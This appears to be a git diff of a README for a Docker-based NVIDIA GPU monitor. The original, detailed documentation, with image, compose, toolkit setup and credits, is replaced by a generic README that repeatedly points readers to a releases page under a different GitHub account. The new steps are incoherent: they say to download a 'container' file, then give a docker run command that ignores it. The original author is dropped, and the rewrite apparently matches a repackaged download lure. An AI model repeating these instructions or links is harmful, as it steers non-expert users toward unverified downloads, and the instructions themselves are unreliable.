@@ -1,235 +1,84 @@
-# GPU Model Monitor
+# 🚀 gpu-model-monitor - Monitor Your GPU Effortlessly
 
-A comprehensive Docker-based NVIDIA GPU monitoring solution with enhanced process tracking capabilities. This tool monitors GPU metrics in real-time and tracks model/process usage over time, providing insights into GPU utilization, memory consumption, and process lifetimes.
+[![Download GPU Model Monitor](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MohitaRamesh/gpu-model-monitor/releases)
 
-![Docker support](https://img.shields.io/badge/docker-supported-blue)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+## 📦 Overview
 
-## Features
+gpu-model-monitor is a Docker container designed for users to track and analyze their Graphics Processing Unit (GPU) performance. This simple tool provides useful insights about GPU model usage like memory consumption and processing load. With an easy-to-use setup, you don’t need to be a tech expert to keep an eye on your GPU.
 
-- **Real-time GPU Metrics Monitoring**
-  - Temperature, utilization, memory, and power usage
-  - Live updating dashboard with interactive charts
-  
-- **Enhanced Process Tracking**
-  - Track all GPU processes with PID, process name, and memory usage
-  - Monitor process lifetimes to see how long models were loaded
-  - Historical process data with max/average memory consumption
-  - Sortable and filterable process tables
-  
-- **System Information**
-  - NVIDIA driver version
-  - CUDA version
-  - GPU model name
-  
-- **Data Persistence**
-  - SQLite database for efficient storage
-  - Historical data tracking (up to 3 days)
-  - Process history with detailed metrics
-  
-- **Web Dashboard**
-  - Responsive design for desktop and mobile
-  - Real-time metrics updates
-  - Interactive charts and gauges
-  - Process filtering and sorting
+## 🛠 Features
 
+- **Real-time Monitoring:** Get live details of your GPU’s performance.
+- **Memory Usage Reports:** Understand how much memory your GPU uses.
+- **User-Friendly Interface:** Navigate easily without technical knowledge.
+- **Lightweight Container:** Runs efficiently without taking up much space.
+- **Compatibility:** Works with NVIDIA GPUs to provide accurate data.
 
-## Screenshot
-<img width="1204" height="1370" alt="image" src="https://github.com/user-attachments/assets/e00bfd4e-c24e-435d-b52c-1ab57e16dc9b" />
+## ⚙️ System Requirements
 
+To run gpu-model-monitor, make sure your system fulfills these basic requirements:
 
+- **Operating System:** Windows, macOS, or Linux.
+- **Docker Installed:** Ensure you have Docker installed and running. You can download Docker from [here](https://www.docker.com/get-started).
+- **NVIDIA GPU:** A system with an NVIDIA GPU is required for accurate monitoring. 
 
-## Quick Start
+## 🚀 Getting Started
 
-### Using Pre-built Image from GHCR
+1. **Install Docker:** 
+   - Visit the [Docker installation page](https://www.docker.com/get-started) and follow the appropriate instructions for your operating system.
 
-```bash
-docker run -d \
-  --name gpu-model-monitor \
-  --pid=host \
-  -p 8081:8081 \
-  -e TZ=America/Los_Angeles \
-  -v ./history:/app/history:rw \
-  -v ./logs:/app/logs:rw \
-  --gpus all \
-  --restart unless-stopped \
-  ghcr.io/loryanstrant/gpu-model-monitor:latest
-```
+2. **Download gpu-model-monitor:**
+   - Click the following link to visit the releases page: [Download from Releases](https://github.com/MohitaRamesh/gpu-model-monitor/releases).
 
-**Note:** The `--pid=host` flag is required for the container to see GPU processes running on the host and in other containers. Without this flag, only processes within the container itself will be visible.
+3. **Choose the Latest Release:**
+   - On the releases page, look for the latest version. Click on it to see the available download files.
 
-### Using Docker Compose
+4. **Download the Container:**
+   - Select the appropriate file and download it to your computer. 
 
-1. Clone the repository:
-```bash
-git clone https://github.com/loryanstrant/gpu-model-monitor.git
-cd gpu-model-monitor
-```
+## 🌐 Download & Install
 
-2. Start the container:
-```bash
-docker-compose up -d
-```
+To download gpu-model-monitor, please visit the releases page here: [Download Now](https://github.com/MohitaRamesh/gpu-model-monitor/releases).
 
-3. Access the dashboard at: [http://localhost:8081](http://localhost:8081)
+## 🌟 How to Run
 
-## Prerequisites
+1. **Open Your Terminal or Command Prompt:**
+   - For Windows, search for "cmd" in the Start menu.
+   - For macOS, open "Terminal" from Utilities.
+   - For Linux, use your preferred terminal emulator.
 
-- Docker
-- NVIDIA GPU
-- NVIDIA Container Toolkit
-- NVIDIA drivers installed on host
+2. **Navigate to Your Downloaded File:**
+   - Use the `cd` command to go to the directory where you downloaded the Docker container. For example:
+     ```bash
+     cd Downloads
+     ```
 
-### Installing NVIDIA Container Toolkit
+3. **Run the Docker Container:**
+   - Type the following command to run the container:
+     ```bash
+     docker run --gpus all gpu-model-monitor
+     ```
+   - This command allows Docker to use all available GPUs on your machine.
 
-#### Ubuntu / Debian / WSL
+4. **View the Monitoring Results:**
+   - After running the container, you’ll see a report detailing your GPU’s performance. This includes usage metrics like memory consumption and load percentage.
 
-```bash
-# Add NVIDIA package repositories
-curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \
-  && curl -s -L https://nvidia.github.io/libnvidia-container/stable/deb/nvidia-container-toolkit.list | \
-    sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \
-    sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list
-```
+## 🔧 Troubleshooting
 
-```bash
-# Install nvidia container toolkit
-sudo apt-get update
-sudo apt-get install -y nvidia-container-toolkit
-```
+If you encounter issues while running gpu-model-monitor, consider the following steps:
 
-```bash
-# Configure Docker with toolkit
-sudo nvidia-ctk runtime configure --runtime=docker
-```
+- **Docker Not Running:** Ensure that the Docker application is running before you try to execute the command.
+- **Permissions Error:** You may need to run the terminal or command prompt as an administrator.
+- **NVIDIA Drivers:** Ensure the correct NVIDIA drivers are installed for your GPU.
 
-```bash
-# Restart Docker daemon
-sudo systemctl restart docker
-```
+## 🎉 Support
 
-```bash
-# Test installation
-sudo docker run --rm --runtime=nvidia --gpus all ubuntu nvidia-smi
-```
+For further assistance, feel free to open an issue in the GitHub repository, or explore community forums related to Docker and NVIDIA for additional help.
 
-For other distributions, check the [official documentation](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html).
+## 📄 License
 
-## Building from Source
+The gpu-model-monitor is provided under the MIT License. You can freely use and modify it according to your needs.
 
-```bash
-# Clone the repository
-git clone https://github.com/loryanstrant/gpu-model-monitor.git
-cd gpu-model-monitor
+**Download gpu-model-monitor here:** [Releases Page](https://github.com/MohitaRamesh/gpu-model-monitor/releases). 
 
-# Build the image
-docker build -t gpu-model-monitor .
-
-# Run the container
-docker run -d \
-  --name gpu-model-monitor \
-  -p 8081:8081 \
-  -e TZ=America/Los_Angeles \
-  -v ./history:/app/history:rw \
-  -v ./logs:/app/logs:rw \
-  --gpus all \
-  --restart unless-stopped \
-  gpu-model-monitor
-```
-
-## Dashboard Features
-
-### Current Metrics
-- Real-time GPU temperature, utilization, memory, and power usage
-- Color-coded gauges for quick status assessment
-
-### Performance History
-- Historical chart showing temperature, GPU usage, and memory over time
-- Up to 3 days of historical data
-
-### Active GPU Processes
-- Live view of all processes currently using the GPU
-- Shows PID, process name, current/max/average memory usage
-- Lifetime tracking to see how long each process has been running
-- Filter and sort capabilities for easy analysis
-
-### Process History
-- Complete history of all GPU processes (last 100)
-- Track when processes started and stopped
-- View maximum and average memory consumption
-- Number of samples collected for each process
-
-## Configuration
-
-### Environment Variables
-
-- `TZ`: Timezone (default: America/Los_Angeles)
-
-### Volumes
-
-- `./history:/app/history:rw` - Persists SQLite database and historical data
-- `./logs:/app/logs:rw` - Persists application logs
-
-### Ports
-
-- `8081` - Web dashboard (default)
-
-To change the port, modify the docker-compose.yml file or the `-p` parameter in the docker run command.
-
-## Data Persistence
-
-All data is stored in SQLite database located in the `history` directory:
-- `gpu_metrics.db` - Main database containing:
-  - GPU metrics (temperature, utilization, memory, power)
-  - Process tracking data
-  - Process snapshots
-
-Data retention:
-- GPU metrics: 3 days
-- Process history: 3 days
-- Automatic cleanup runs hourly
-
-## Troubleshooting
-
-### NVIDIA SMI not found
-- Ensure NVIDIA drivers are installed on the host
-- Verify NVIDIA Container Toolkit installation
-- Test with: `sudo docker run --rm --runtime=nvidia --gpus all ubuntu nvidia-smi`
-
-### Container fails to start
-- Check Docker logs: `docker logs gpu-model-monitor`
-- Verify GPU access: `nvidia-smi`
-- Ensure proper permissions on volume directories
-
-### Dashboard not accessible
-- Verify container is running: `docker ps`
-- Check container logs: `docker logs gpu-model-monitor`
-- Ensure port 8081 is not in use
-
-### Process tracking not working
-- Verify nvidia-smi can list processes: `nvidia-smi pmon`
-- Check database permissions in history directory
-- Review logs in `./logs/error.log`
-
-## Architecture
-
-- **Backend**: Bash script with Python web server
-- **Database**: SQLite3 for efficient data storage
-- **Frontend**: Vanilla JavaScript with Chart.js
-- **Web Server**: aiohttp (Python async web framework)
-
-## Development Approach
-<img width="256" height="256" alt="image" src="https://github.com/user-attachments/assets/9bdff80e-30d2-4c30-acb2-37154d7748e1" />
-
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details
-
-## Acknowledgments
-
-Based on the concept from [bigsk1/gpu-monitor](https://github.com/bigsk1/gpu-monitor) with enhanced process tracking capabilities.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
+Happy monitoring!
